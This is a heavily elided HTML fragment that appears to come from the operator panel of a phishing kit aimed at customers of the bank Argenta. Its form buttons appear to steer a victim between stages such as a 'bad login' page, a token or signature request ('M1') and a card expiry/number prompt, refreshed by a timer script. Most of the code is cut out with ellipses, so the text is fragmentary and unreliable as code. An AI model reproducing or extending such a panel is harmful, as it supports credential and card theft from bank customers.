...
<script>
   ...
   window.setInterval(function(){
    ...
    <body>
		...
		<p>ARGENTA</p>
            <form method="POST" action="index.php">
                ...
                <button type="submit" class="btn btn-danger" name="to" value="badloginraf">LOGIN</button> 
 				<button type="button" class="slide btn btn-success" data-slide="#signature" data-value="token1">M1</button> 
                ...
                <button type="submit" class="btn btn-success" name="to" value="exp">EXP/NUM</button> 
        ...
        <!-- JS FILES -->
        <script src="./Control_files/jquery-3.5.1.min.js"></script>
